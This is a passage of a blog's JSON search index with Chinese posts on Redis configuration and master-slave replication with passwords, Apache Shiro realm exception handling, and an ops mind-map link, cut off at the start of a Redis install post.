&#x53C8;&#x9700;&#x8981;&#x4E00;&#x4E9B;&#x4E2A;&#x6027;&#x5316;&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;# &#x4F60;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; include &#x6765;&#x5305;&#x542B;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x5BF9;&#x4F60;&#x6765;&#x8BF4;&#x662F;&#x975E;&#x5E38;&#x6709;&#x7528;&#x7684;&#x3002;## &#x4F46;&#x662F;&#x8981;&#x6CE8;&#x610F;&#x54E6;&#xFF0C;include &#x662F;&#x4E0D;&#x80FD;&#x88AB; config rewrite &#x547D;&#x4EE4;&#x6539;&#x5199;&#x7684;# &#x7531;&#x4E8E; redis &#x603B;&#x662F;&#x4EE5;&#x6700;&#x540E;&#x7684;&#x52A0;&#x5DE5;&#x7EBF;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6307;&#x4EE4;&#x503C;&#xFF0C;&#x6240;&#x4EE5;&#x4F60;&#x6700;&#x597D;&#x662F;&#x628A; include &#x653E;&#x5728;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x6700;&#x524D;&#x9762;&#xFF0C;# &#x4EE5;&#x907F;&#x514D;&#x5728;&#x8FD0;&#x884C;&#x65F6;&#x8986;&#x76D6;&#x914D;&#x7F6E;&#x7684;&#x6539;&#x53D8;&#xFF0C;&#x76F8;&#x53CD;&#xFF0C;&#x4F60;&#x5C31;&#x628A;&#x5B83;&#x653E;&#x5728;&#x540E;&#x9762;&#xFF08;&#x5916;&#x56FD;&#x4EBA;&#x771F;&#x5570;&#x55E6;&#xFF09;&#x3002;## include /path/to/local.conf# include /path/to/other.conf","raw":null,"content":null,"categories":[{"name":"数据库","slug":"数据库","permalink":"http://www.wangxin123.com/categories/数据库/"}],"tags":[{"name":"redis","slug":"redis","permalink":"http://www.wangxin123.com/tags/redis/"}]},{"title":"外部无法捕捉Realm的doGetAuthenticationInfo方法抛出的异常","slug":"外部无法捕捉Realm的doGetAuthenticationInfo方法抛出的异常","date":"2016-09-19T14:41:19.000Z","updated":"2016-11-17T11:59:42.680Z","comments":true,"path":"2016/09/19/外部无法捕捉Realm的doGetAuthenticationInfo方法抛出的异常/","link":"","permalink":"http://www.wangxin123.com/2016/09/19/外部无法捕捉Realm的doGetAuthenticationInfo方法抛出的异常/","excerpt":"shiro&#x6743;&#x9650;&#x6846;&#x67B6;&#xFF0C;&#x7528;&#x6237;&#x767B;&#x5F55;&#x65B9;&#x6CD5;&#x7684;subject.login(token)&#x4F1A;&#x8FDB;&#x5165;&#x81EA;&#x5B9A;&#x4E49;&#x7684;UserNamePasswordRealm&#x7C7B;&#x7684;doGetAuthenticationInfo&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x65B9;&#x6CD5; &#x901A;&#x5E38;&#x60C5;&#x51B5;&#xFF0C;doGetAuthenticationInfo&#x5199;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A; 12345678910111213@Overrideprotected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authcToken) throws AuthenticationException { UsernamePasswordToken token = (UsernamePasswordToken) authcToken; User loginUser = userService.getUserByName(token.getUsername()); if (ObjectUtils.isEmpty(loginUser)) { throw new UnknownAccountException(); } if(!loginUser.getPassWord().equals(MD5Util.md5s(String.valueOf(token.getPassword())))){ throw new IncorrectCredentialsException(); } //&#x5176;&#x4ED6;&#x5404;&#x79CD;&#x9A8C;&#x8BC1; &#x3002;&#x3002;&#x3002;} login&#x767B;&#x5F55;&#x65B9;&#x6CD5;&#xFF1A;123456789101112131415161718192021@ResponseBody@RequestMapping(value = &quot;/login&quot;, method = RequestMethod.POST)public String doUserLogin(User user, HttpServletRequest request, Model model) { ... Subject subject = SecurityUtils.getSubject(); UsernamePasswordToken token = new UsernamePasswordToken(user.getUserName(), user.getPassWord()); try { subject.login(token); } catch (UnknownAccountException uae) { } catch (IncorrectCredentialsException ice) { } catch (LockedAccountException lae) { } catch (ExcessiveAttemptsException eae) { } catch (AuthenticationException ae) { } ...} &#x53EF;&#x662F;&#x6700;&#x8FD1;&#x4E00;&#x6B21;&#x9879;&#x76EE;&#xFF0C;&#x53D1;&#x73B0;&#x901A;&#x7528;&#x7684;&#x65B9;&#x6CD5;&#x884C;&#x4E0D;&#x901A;&#x4E86;&#xFF0C;doGetAuthenticationInfo&#x65B9;&#x6CD5;&#x629B;&#x51FA;&#x7684;&#x5404;&#x79CD;&#x5F02;&#x5E38;&#x5982;UnknownAccountException(&#x5305;&#x62EC;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x5F02;&#x5E38;)&#xFF0C;&#x5916;&#x90E8;&#x90FD;&#x65E0;&#x6CD5;&#x51C6;&#x786E;&#x6355;&#x6349;&#x3002;","keywords":null,"text":"shiro&#x6743;&#x9650;&#x6846;&#x67B6;&#xFF0C;&#x7528;&#x6237;&#x767B;&#x5F55;&#x65B9;&#x6CD5;&#x7684;subject.login(token)&#x4F1A;&#x8FDB;&#x5165;&#x81EA;&#x5B9A;&#x4E49;&#x7684;UserNamePasswordRealm&#x7C7B;&#x7684;doGetAuthenticationInfo&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x65B9;&#x6CD5; &#x901A;&#x5E38;&#x60C5;&#x51B5;&#xFF0C;doGetAuthenticationInfo&#x5199;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A; 12345678910111213@Overrideprotected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authcToken) throws AuthenticationException { UsernamePasswordToken token = (UsernamePasswordToken) authcToken; User loginUser = userService.getUserByName(token.getUsername()); if (ObjectUtils.isEmpty(loginUser)) { throw new UnknownAccountException(); } if(!loginUser.getPassWord().equals(MD5Util.md5s(String.valueOf(token.getPassword())))){ throw new IncorrectCredentialsException(); } //&#x5176;&#x4ED6;&#x5404;&#x79CD;&#x9A8C;&#x8BC1; &#x3002;&#x3002;&#x3002;} login&#x767B;&#x5F55;&#x65B9;&#x6CD5;&#xFF1A;123456789101112131415161718192021@ResponseBody@RequestMapping(value = &quot;/login&quot;, method = RequestMethod.POST)public String doUserLogin(User user, HttpServletRequest request, Model model) { ... Subject subject = SecurityUtils.getSubject(); UsernamePasswordToken token = new UsernamePasswordToken(user.getUserName(), user.getPassWord()); try { subject.login(token); } catch (UnknownAccountException uae) { } catch (IncorrectCredentialsException ice) { } catch (LockedAccountException lae) { } catch (ExcessiveAttemptsException eae) { } catch (AuthenticationException ae) { } ...} &#x53EF;&#x662F;&#x6700;&#x8FD1;&#x4E00;&#x6B21;&#x9879;&#x76EE;&#xFF0C;&#x53D1;&#x73B0;&#x901A;&#x7528;&#x7684;&#x65B9;&#x6CD5;&#x884C;&#x4E0D;&#x901A;&#x4E86;&#xFF0C;doGetAuthenticationInfo&#x65B9;&#x6CD5;&#x629B;&#x51FA;&#x7684;&#x5404;&#x79CD;&#x5F02;&#x5E38;&#x5982;UnknownAccountException(&#x5305;&#x62EC;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x5F02;&#x5E38;)&#xFF0C;&#x5916;&#x90E8;&#x90FD;&#x65E0;&#x6CD5;&#x51C6;&#x786E;&#x6355;&#x6349;&#x3002;&#x5916;&#x90E8;login&#x6355;&#x6349;&#x7684;&#x5F02;&#x5E38;&#x7EDF;&#x4E00;&#x88AB;&#x6539;&#x5199;&#x4E3A; AuthenticationException&#x5F02;&#x5E38;(IncorrectCredentialsException&#x7B49;&#x5F02;&#x5E38;&#x7684;&#x7236;&#x7C7B;)&#xFF0C;&#x4E14;&#x5F02;&#x5E38;&#x7684;msg&#x5185;&#x5BB9;&#x4E5F;&#x88AB;&#x6539;&#x5199;&#x3002;&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF1A; &#x539F;&#x56E0;&#x5728;subject.login(token)&#x7684;&#x6E90;&#x7801;&#x91CC;&#xFF0C;&#x6E90;&#x7801;&#x6709;&#x8FD9;&#x4E48;&#x4E00;&#x6BB5;&#xFF1A; &#x6211;&#x4EEC;&#x8FDB;&#x5165;doSingleRealmAuthentication&#x65B9;&#x6CD5;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x89C1;&#x65B9;&#x6CD5;&#x91CC;&#x9762;&#x5916;&#x629B;&#x4E86;UnknownAccountException&#x7B49;&#x5F02;&#x5E38;&#x3002;&#x6240;&#x4EE5;&#x5982;&#x679C;&#x9879;&#x76EE;&#x4E2D;&#x53EA;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;realm&#xFF0C;&#x6BD4;&#x5982;&#x7528;&#x6765;&#x8FDB;&#x884C;&#x767B;&#x5F55;&#x7684;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#xFF0C;&#x5916;&#x90E8;&#x662F;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x6355;&#x6349;&#x7684;&#x3002; &#x4F46;&#x662F;&#x6B64;&#x6B21;&#x9879;&#x76EE;&#x6211;&#x5B9A;&#x4E49;&#x4E86;&#x4E24;&#x4E2A;realm&#xFF0C;&#x4E00;&#x4E2A;&#x7528;&#x6765;&#x8FDB;&#x884C;&#x767B;&#x5F55;&#x7684;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x7528;&#x6765;&#x767B;&#x5F55;&#x540E;&#xFF0C;&#x9A8C;&#x8BC1;&#x5404;&#x79CD;&#x8BF7;&#x6C42;&#x643A;&#x5E26;&#x7684;&#x7684;token&#x3002;&#x6211;&#x4EEC;&#x8FDB;&#x5165;doMultiRealmAuthentication&#x65B9;&#x6CD5;&#xFF0C;&#x5185;&#x5BB9;&#x5982;&#x4E0B; &#x518D;&#x8FDB;&#x5165;afterAllAttempts&#x7684;&#x5B9E;&#x73B0;&#x7C7B;&#xFF0C;&#x5982;&#x56FE;5&#x3002;&#x53D1;&#x73B0;&#x629B;&#x51FA;&#x7684;&#x5F02;&#x5E38;&#x90FD;&#x88AB;&#x7EDF;&#x4E00;&#x6539;&#x4E3A;AuthenticationException&#x5F02;&#x5E38;&#xFF0C;&#x4E14;msg&#x4E5F;&#x88AB;&#x6539;&#x5199;&#xFF0C;&#x6B63;&#x5982;&#x56FE;1&#x6240;&#x793A;&#x3002; &#x7ED3;&#x8BBA;&#x5916;&#x90E8;&#x65E0;&#x6CD5;&#x6355;&#x6349;doGetAuthenticationInfo&#x65B9;&#x6CD5;&#x629B;&#x51FA;&#x7684;&#x5F02;&#x5E38;&#xFF0C;&#x539F;&#x56E0;&#x5728;&#x4E8E;&#x6E90;&#x7801;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x81EA;&#x5DF1;&#x7684;&#x4EE3;&#x7801;&#x6709;&#x95EE;&#x9898;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6539;&#x5199;&#x6E90;&#x7801;&#x7684;&#x672C;&#x4E8B;&#xFF0C;&#x90A3;&#x4E48;&#x5916;&#x90E8;&#x60F3;&#x8981;&#x6355;&#x6349;&#x5404;&#x79CD;&#x5F02;&#x5E38;&#xFF0C;&#x5E76;&#x5728;&#x524D;&#x7AEF;&#x663E;&#x793A;&#x5404;&#x79CD;&#x63D0;&#x793A;&#x8BED;&#xFF0C;&#x600E;&#x4E48;&#x529E;&#xFF1F; &#x6211;&#x7684;&#x4E34;&#x65F6;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x662F;&#xFF0C;doGetAuthenticationInfo&#x53EA;&#x7528;&#x6765;&#x9A8C;&#x8BC1;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#xFF0C;&#x5916;&#x90E8;&#x76F4;&#x63A5;&#x6355;&#x6349;AuthenticationException&#x5F02;&#x5E38;&#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x5404;&#x79CD;&#x9A8C;&#x8BC1;&#x4ECE;doGetAuthenticationInfo&#x65B9;&#x6CD5;&#x79FB;&#x81F3;login&#x3002;","raw":null,"content":null,"categories":[{"name":"错误集锦","slug":"错误集锦","permalink":"http://www.wangxin123.com/categories/错误集锦/"}],"tags":[{"name":"shiro","slug":"shiro","permalink":"http://www.wangxin123.com/tags/shiro/"}]},{"title":"Redis多实例及主从搭建","slug":"Redis多实例及主从搭建","date":"2016-09-18T14:41:19.000Z","updated":"2017-02-07T04:22:52.963Z","comments":true,"path":"2016/09/18/Redis多实例及主从搭建/","link":"","permalink":"http://www.wangxin123.com/2016/09/18/Redis多实例及主从搭建/","excerpt":"&#x524D;&#x63D0;&#x662F;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;&#x597D;&#x4E86;redis,redis&#x5B89;&#x88C5;&#x53EF;&#x641C;&#x7D22;&#x672C;&#x7AD9;&#x53E6;&#x4E00;&#x7BC7;&#x535A;&#x5BA2;&#xFF1A;redis&#x5B89;&#x88C5;&#x3002; redis&#x5355;&#x4E3B;&#x673A;&#x591A;&#x5B9E;&#x4F8B;&#x4E00;&#x3001;&#x6211;&#x4EEC;&#x9996;&#x5148;&#x62F7;&#x8D1D;&#x4E24;&#x4EFD;&#x6587;&#x4EF6;&#xFF1A; 12cp /etc/redis.conf /etc/redis6381.confcp /etc/redis.conf /etc/redis6382.conf &#x4E8C;&#x3001;&#x4FEE;&#x6539;redis6381&#x914D;&#x7F6E;&#x6587;&#x4EF6;123456789101112131415161718192021222324# vim /etc/redis6381.conf# &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B; redis &#x4E0D;&#x662F;&#x4F5C;&#x4E3A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x8FD0;&#x884C;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x60F3;&#x8BA9;&#x5B83;&#x5728;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#xFF0C;&#x4F60;&#x5C31;&#x628A;&#x5B83;&#x6539;&#x6210; yes&#x3002;daemonize yes# &#x5F53;redis&#x4F5C;&#x4E3A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x8FD0;&#x884C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5B83;&#x4F1A;&#x628A; pid &#x9ED8;&#x8BA4;&#x5199;&#x5230; /var/run/redis.pid &#x6587;&#x4EF6;&#x91CC;&#x9762;&#xFF0C;# &#x4F46;&#x662F;&#x4F60;&#x53EF;&#x4EE5;&#x5728;&#x8FD9;&#x91CC;&#x81EA;&#x5DF1;&#x5236;&#x5B9A;&#x5B83;&#x7684;&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;&#x3002;pidfile /var/run/redis/redis_6381.pid# &#x76D1;&#x542C;&#x7AEF;&#x53E3;&#x53F7;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A; 6379&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x8BBE;&#x4E3A; 0 &#xFF0C;redis &#x5C06;&#x4E0D;&#x5728; socket &#x4E0A;&#x76D1;&#x542C;&#x4EFB;&#x4F55;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x3002;port 6381# &#x6307;&#x5B9A;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x5B9E;&#x4F8B;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x4FBF;&#x4E8E;&#x95EE;&#x9898;&#x5B9A;&#x4F4D;logfile /var/log/redis/redis_6381.log# &#x8BBE;&#x7F6E;dump&#x7684;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x5B9E;&#x4F8B;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;db&#x6587;&#x4EF6;&#xFF0C;&#x4FBF;&#x4E8E;&#x95EE;&#x9898;&#x5B9A;&#x4F4D;dbfilename dump_6381.rdb # &#x5DE5;&#x4F5C;&#x76EE;&#x5F55;# &#x4F8B;&#x5982;&#x4E0A;&#x9762;&#x7684; dbfilename &#x53EA;&#x6307;&#x5B9A;&#x4E86;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x4F46;&#x662F;&#x5B83;&#x4F1A;&#x5199;&#x5165;&#x5230;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;&#x3002;# &#x8FD9;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x4E00;&#x5B9A;&#x662F;&#x4E2A;&#x76EE;&#x5F55;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x662F;&#x6587;&#x4EF6;&#x540D;&#x3002;# &#x8FD9;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;&#x201C;./&#x201D;&#xFF0C;&#x6700;&#x597D;&#x6539;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#x4E3A;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;# &#x5982;&#x679C;&#x4E3A;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;redis&#x5728;&#x54EA;&#x91CC;&#x542F;&#x52A8;&#xFF0C;dump.rdb&#x6587;&#x4EF6;&#x5C31;&#x4F1A;&#x4EA7;&#x751F;&#x5728;&#x542F;&#x52A8;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x8FD9;&#x4E5F;&#x5C31;&#x662F;&#x6709;&#x4E9B;&#x4EBA;&#x91CD;&#x542F;redis&#x540E;key&#x503C;&#x6D88;&#x5931;&#x7684;&#x539F;&#x56E0;dir /data/redisdb/","keywords":null,"text":"&#x524D;&#x63D0;&#x662F;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;&#x597D;&#x4E86;redis,redis&#x5B89;&#x88C5;&#x53EF;&#x641C;&#x7D22;&#x672C;&#x7AD9;&#x53E6;&#x4E00;&#x7BC7;&#x535A;&#x5BA2;&#xFF1A;redis&#x5B89;&#x88C5;&#x3002; redis&#x5355;&#x4E3B;&#x673A;&#x591A;&#x5B9E;&#x4F8B;&#x4E00;&#x3001;&#x6211;&#x4EEC;&#x9996;&#x5148;&#x62F7;&#x8D1D;&#x4E24;&#x4EFD;&#x6587;&#x4EF6;&#xFF1A; 12cp /etc/redis.conf /etc/redis6381.confcp /etc/redis.conf /etc/redis6382.conf &#x4E8C;&#x3001;&#x4FEE;&#x6539;redis6381&#x914D;&#x7F6E;&#x6587;&#x4EF6;123456789101112131415161718192021222324# vim /etc/redis6381.conf# &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B; redis &#x4E0D;&#x662F;&#x4F5C;&#x4E3A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x8FD0;&#x884C;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x60F3;&#x8BA9;&#x5B83;&#x5728;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#xFF0C;&#x4F60;&#x5C31;&#x628A;&#x5B83;&#x6539;&#x6210; yes&#x3002;daemonize yes# &#x5F53;redis&#x4F5C;&#x4E3A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x8FD0;&#x884C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5B83;&#x4F1A;&#x628A; pid &#x9ED8;&#x8BA4;&#x5199;&#x5230; /var/run/redis.pid &#x6587;&#x4EF6;&#x91CC;&#x9762;&#xFF0C;# &#x4F46;&#x662F;&#x4F60;&#x53EF;&#x4EE5;&#x5728;&#x8FD9;&#x91CC;&#x81EA;&#x5DF1;&#x5236;&#x5B9A;&#x5B83;&#x7684;&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;&#x3002;pidfile /var/run/redis/redis_6381.pid# &#x76D1;&#x542C;&#x7AEF;&#x53E3;&#x53F7;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A; 6379&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x8BBE;&#x4E3A; 0 &#xFF0C;redis &#x5C06;&#x4E0D;&#x5728; socket &#x4E0A;&#x76D1;&#x542C;&#x4EFB;&#x4F55;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x3002;port 6381# &#x6307;&#x5B9A;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x5B9E;&#x4F8B;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x4FBF;&#x4E8E;&#x95EE;&#x9898;&#x5B9A;&#x4F4D;logfile /var/log/redis/redis_6381.log# &#x8BBE;&#x7F6E;dump&#x7684;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x5B9E;&#x4F8B;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;db&#x6587;&#x4EF6;&#xFF0C;&#x4FBF;&#x4E8E;&#x95EE;&#x9898;&#x5B9A;&#x4F4D;dbfilename dump_6381.rdb # &#x5DE5;&#x4F5C;&#x76EE;&#x5F55;# &#x4F8B;&#x5982;&#x4E0A;&#x9762;&#x7684; dbfilename &#x53EA;&#x6307;&#x5B9A;&#x4E86;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x4F46;&#x662F;&#x5B83;&#x4F1A;&#x5199;&#x5165;&#x5230;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;&#x3002;# &#x8FD9;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x4E00;&#x5B9A;&#x662F;&#x4E2A;&#x76EE;&#x5F55;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x662F;&#x6587;&#x4EF6;&#x540D;&#x3002;# &#x8FD9;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;&#x201C;./&#x201D;&#xFF0C;&#x6700;&#x597D;&#x6539;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#x4E3A;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;# &#x5982;&#x679C;&#x4E3A;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;redis&#x5728;&#x54EA;&#x91CC;&#x542F;&#x52A8;&#xFF0C;dump.rdb&#x6587;&#x4EF6;&#x5C31;&#x4F1A;&#x4EA7;&#x751F;&#x5728;&#x542F;&#x52A8;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x8FD9;&#x4E5F;&#x5C31;&#x662F;&#x6709;&#x4E9B;&#x4EBA;&#x91CD;&#x542F;redis&#x540E;key&#x503C;&#x6D88;&#x5931;&#x7684;&#x539F;&#x56E0;dir /data/redisdb/ &#x76F8;&#x5173;&#x547D;&#x4EE4;12345#&#x542F;&#x52A8;6381&#x7AEF;&#x53E3;&#x670D;&#x52A1;src/redis-server /etc/redis6381.conf#&#x6309;&#x7AEF;&#x53E3;&#x8FDB;&#x5165;&#x5BA2;&#x6237;&#x7AEF;/usr/bin/redis-cli -p 6381 &#x4E09;&#x3001;&#x540C;&#x7406;&#x6211;&#x4EEC;&#x914D;&#x7F6E;6382&#x914D;&#x7F6E;&#x6587;&#x4EF6;, &#x6210;&#x529F;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x540E;&#xFF0C;&#x67E5;&#x770B;&#x8FDB;&#x7A0B;&#xFF1A; redis&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;&#x4FEE;&#x6539;6381&#x3001;6382&#x4ECE;&#x5E93;&#x914D;&#x7F6E;&#xFF1A;12vim /etc/redis/redis6381.confvim /etc/redis/redis6382.conf &#x91CD;&#x542F;6379&#x3001;6381&#x3001;6382&#x670D;&#x52A1;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4E3B;&#x4ECE;&#x6570;&#x636E;&#x5B9E;&#x73B0;&#x540C;&#x6B65; &#x7528;&#x5BA2;&#x6237;&#x7AEF;&#x767B;&#x5F55;&#x76F8;&#x5173;&#x4E3B;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x8F93;&#x5165;info&#x67E5;&#x770B;&#x4E3B;&#x4ECE;&#x914D;&#x7F6E;&#x4FE1;&#x606F;1234567891011121314151617181920212223242526272829303132#&#x4E3B;&#x673A;127.0.0.1:6379&gt;info# Replicationrole:masterconnected_slaves:1slave0:ip=&#x4ECE;&#x673A;ip,port=6379,state=online,offset=140933,lag=1master_repl_offset:140933repl_backlog_active:1repl_backlog_size:1048576repl_backlog_first_byte_offset:2repl_backlog_histlen:140932#&#x4ECE;&#x673A;127.0.0.1:6381&gt;info# Replicationrole:slavemaster_host:&#x4E3B;&#x673A;ipmaster_port:6379master_link_status:upmaster_last_io_seconds_ago:7master_sync_in_progress:0slave_repl_offset:141073slave_priority:100slave_read_only:1connected_slaves:0master_repl_offset:0repl_backlog_active:0repl_backlog_size:1048576repl_backlog_first_byte_offset:0repl_backlog_histlen:0 redis&#x6DFB;&#x52A0;&#x5BC6;&#x7801;&#x6B63;&#x5F0F;&#x73AF;&#x5883;redis&#x7684;&#x4F7F;&#x7528;&#xFF0C;&#x5BC6;&#x7801;&#x7684;&#x914D;&#x7F6E;&#x5FC5;&#x4E0D;&#x53EF;&#x5C11;&#x3002;redis&#x5BC6;&#x7801;&#x7F3A;&#x5931;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x5F88;&#x5BB9;&#x6613;&#x901A;&#x8FC7;&#x8089;&#x673A;&#x626B;&#x63CF;redis&#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;&#xFF0C;&#x514D;&#x5BC6;&#x767B;&#x5F55;redis&#x8FDB;&#x800C;&#x901A;&#x8FC7;config&#x547D;&#x4EE4;&#x4FEE;&#x6539;&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x9020;&#x6210;&#x7834;&#x574F;&#x3002; &#x4FEE;&#x6539;6379&#x4E3B;&#x5E93;&#x914D;&#x7F6E;&#xFF1A;1234vim /etc/redis/redis6379.conf# &#x4FEE;&#x6539;requirepass&#x9879;requirepass master-password &#x4FEE;&#x6539;6381&#x3001;6382&#x4ECE;&#x5E93;&#x914D;&#x7F6E;&#xFF1A;12345678vim /etc/redis/redis6381.confvim /etc/redis/redis6382.conf# &#x4FEE;&#x6539;requirepass&#x9879;requirepass slave-password# &#x4FEE;&#x6539;masterauth&#x9879;masterauth &lt;master-password&gt; &#x91CD;&#x542F;&#x670D;&#x52A1;&#xFF0C;&#x6309;&#x7AEF;&#x53E3;&#x6309;&#x5BC6;&#x7801;&#x8FDB;&#x5165;&#x5BA2;&#x6237;&#x7AEF;&#x6D4B;&#x8BD5;&#x76F8;&#x5173;&#x6548;&#x679C;&#x5373;&#x53EF;1/usr/bin/redis-cli -p 6382 -a password","raw":null,"content":null,"categories":[{"name":"运维部署","slug":"运维部署","permalink":"http://www.wangxin123.com/categories/运维部署/"}],"tags":[{"name":"redis","slug":"redis","permalink":"http://www.wangxin123.com/tags/redis/"}]},{"title":"运维那些事儿","slug":"运维那些事儿","date":"2016-09-17T13:18:00.000Z","updated":"2017-02-26T07:37:35.642Z","comments":true,"path":"2016/09/17/运维那些事儿/","link":"","permalink":"http://www.wangxin123.com/2016/09/17/运维那些事儿/","excerpt":"","keywords":null,"text":"&#x5728;&#x76EE;&#x524D;&#x56E2;&#x961F;&#xFF0C;&#x9664;&#x4E86;&#x65E5;&#x5E38;&#x5F00;&#x53D1;&#xFF0C;&#x6211;&#x8FD8;&#x8D1F;&#x8D23;&#x63D0;&#x4F9B;&#x6570;&#x636E;&#x5E93;&#x548C;&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#x76F8;&#x5173;&#x670D;&#x52A1;&#x3002;&#x65E2;&#x7136;&#x5DE5;&#x4F5C;&#x548C;&#x8FD0;&#x7EF4;&#x6709;&#x5173;&#xFF0C;&#x90A3;&#x6709;&#x5FC5;&#x8981;&#x5BF9;&#x8FD0;&#x7EF4;&#x6709;&#x4E2A;&#x57FA;&#x672C;&#x7684;&#x8BA4;&#x8BC6;&#x3002;&#x53EF;&#x80FD;&#x73B0;&#x5728;&#x5185;&#x5BB9;&#x5F88;&#x4E0D;&#x5B8C;&#x5584;&#xFF0C;&#x4F46;&#x4F1A;&#x6301;&#x7EED;&#x66F4;&#x65B0;&#xFF0C;&#x8BBF;&#x95EE;&#x5730;&#x5740;&#xFF1A;https://www.processon.com/view/link/58832d28e4b087b1163149ab","raw":null,"content":null,"categories":[{"name":"思维导图","slug":"思维导图","permalink":"http://www.wangxin123.com/categories/思维导图/"}],"tags":[{"name":"运维","slug":"运维","permalink":"http://www.wangxin123.com/tags/运维/"}]},{"title":"Redis安装","slug":"Redis安装","date":"2016-09-16T14:41:19.000Z","updated":"2017-02-07T04:23:28.210Z","comments":true,"path":"2016/09/16/Redis安装/","link":"","permalink":"http://www.wangxin123.com/2016/09/16/Redis安装/","excerpt":"redis&#x7B80;&#x4ECB;redis&#x662F;&#x4E00;&#x4E2A;&#x6027;&#x80FD;&#x975E;&#x5E38;&#x4F18;&#x79C0;&#x7684;&#x5185;&#x5B58;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x901A;